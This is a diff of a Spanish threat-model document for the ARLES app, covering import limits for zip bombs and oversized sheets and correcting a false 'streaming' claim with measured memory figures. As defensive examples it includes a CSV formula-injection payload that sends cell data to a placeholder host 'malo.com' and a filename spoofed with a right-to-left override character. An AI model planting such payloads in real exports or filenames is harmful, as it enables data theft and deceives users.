@@ -46,12 +46,48 @@ Todo dato que entra desde fuera es no confiable. Las fuentes reales:
 
 | Amenaza | Vector | Mitigación |
 |---|---|---|
-| **DoS** | Zip bomb en XLSX (un `.xlsx` es un ZIP) | Tope de **ratio de descompresión ~100:1**, tope de bytes descomprimidos, tope de entradas, timeout. Lectura en **streaming** con `calamine` |
-| **DoS** | 500 000 filas × celdas gigantes | Tope de filas, tope de bytes por celda, tope de celdas totales |
+| **DoS** | Zip bomb en XLSX (un `.xlsx` es un ZIP) | **El archivo se descomprime primero contando y tirando los bytes**, con tope de `MAX_BYTES_DESCOMPRIMIDOS` (300 MB). Sólo si pasa se abre la hoja. Ver el aviso de abajo: la versión anterior de esta fila era falsa |
+| **DoS** | 500 000 filas × celdas gigantes | Tope de celdas totales (8 000 000), tope de columnas (64), tope de bytes en disco (200 MB). **No hay tope por celda**: es una decisión consciente, anotada abajo |
+| **DoS** | Filas vacías por delante de los encabezados | Se cuentan y se quitan de una vez. Quitarlas de una en una costaba el cuadrado de su número: 200 000 filas vacías colgaban la importación sin dar error |
 | **Tampering** | Nombre de archivo malicioso (`../../`, dispositivos reservados de Windows, longitud extrema) | **El nombre suministrado nunca se usa para escribir en disco.** Se genera un UUID (`stored_filename`); el original se guarda como metadato |
+| **Spoofing** | Nombre de archivo que **se dibuja al revés** (`U+202E` y demás caracteres de formato): `factura‮gnp.exe` se lee en pantalla como `facturaexe.png` | Se quitan los caracteres de control y de formato del nombre antes de guardarlo, y se recorta a 120 caracteres. El registro de importación es la prueba de qué se importó; un nombre disfrazado no prueba nada |
 | **Elevación** | Inyección de fórmulas CSV | Al importar **nada se evalúa jamás**. Al **exportar**, se antepone `'` a toda celda que empiece por `=`, `+`, `-`, `@`, tabulador o retorno de carro |
 | **Elevación** | XXE en el XML del XLSX | `calamine` no resuelve entidades externas. Se verifica y se fija como requisito de la dependencia |
 | **Info disclosure** | Rutas absolutas en mensajes de error | Los errores nunca incluyen rutas del sistema de archivos |
+
+> ### ⚠ Lo que esta tabla decía y no era verdad
+>
+> Hasta el 18/09/2026 esta fila decía «lectura en **streaming** con `calamine`».
+> **Era falso, y nadie lo había comprobado.** `calamine` construye la hoja
+> entera en memoria antes de devolver la primera fila, así que el tope de celdas
+> —que se contaba recorriendo filas— llegaba siempre tarde.
+>
+> Medido con un archivo construido a propósito (`crates/arles-import/tests/bomba.rs`):
+>
+> | | Antes | Después |
+> |---|---|---|
+> | Archivo en disco | 47 MB | 47 MB |
+> | Celdas declaradas | 16 000 000 | 16 000 000 |
+> | **Pico de memoria al leerlo** | **+1 586 MB** | **+0 MB** |
+> | Error devuelto | `DemasiadosDatos` | `DemasiadosDatos` |
+>
+> Las dos columnas devuelven el mismo error. Ésa es exactamente la razón por la
+> que el fallo llevaba ahí sin verse: **una prueba que sólo mirara el error
+> habría pasado en las dos**. Hizo falta medir la memoria.
+>
+> En un equipo de 4 GB, «antes» no es un error: es la aplicación cerrándose con
+> el trabajo del usuario dentro.
+>
+> **Regla que deja esto:** una mitigación que dependa de cómo se comporta una
+> biblioteca por dentro no vale escrita — vale medida. Las demás filas de esta
+> tabla que digan «la biblioteca no hace X» llevan su prueba en
+> `crates/arles-import/tests/ataques.rs`.
+
+> **Sobre el tope por celda, que no existe:** una sola celda de 50 MB pasa por
+> debajo del tope de celdas —es una— y por debajo del de bytes. Se mide en
+> `ataques.rs` y hoy **se acepta**: para hacer daño hay que tener ya un archivo
+> de decenas de megabytes, que el tope de disco limita. Queda escrito aquí para
+> que sea una decisión y no un olvido.
 
 > **Sobre la inyección de fórmulas:** el riesgo real de ARLES no está en importar —nunca evaluamos nada— sino en **exportar**. Un contacto cuyo nombre sea `=HYPERLINK("http://malo.com?d="&A1,"Click")` es inofensivo dentro de ARLES y peligroso en cuanto alguien abre el CSV exportado en Excel. Por eso la neutralización va en la exportación.
 
@@ -190,7 +226,7 @@ de comprobación.
 - [x] CSP sin `unsafe-inline` ni `unsafe-eval` — verificado en la Fase 2 ejercitando la aplicación bajo la política del producto (`sonda:csp`)
 - [x] Ningún campo de entrada ofrece autocompletado ni corrector por defecto: las credenciales no pueden acabar en el gestor de contraseñas de la webview (§30)
 - [ ] Sanitizado HTML en Rust, al guardar **y** al usar
-- [ ] Topes de zip bomb, filas, celdas y timeout verificados con archivos reales
+- [x] Topes de zip bomb, filas, celdas y nombre verificados **con archivos reales construidos a propósito** — 13 ataques en `crates/arles-import/tests/ataques.rs` y `bomba.rs` (18/09/2026). El de la bomba mide el **pico de memoria**, no sólo el error: sin eso, la defensa rota pasaba la prueba
 - [ ] Neutralización de fórmulas en la **exportación** CSV
 - [ ] La aplicación se niega a arrancar sin llavero (probado, no supuesto)
 - [ ] Las respuestas SMTP se tratan como no confiables
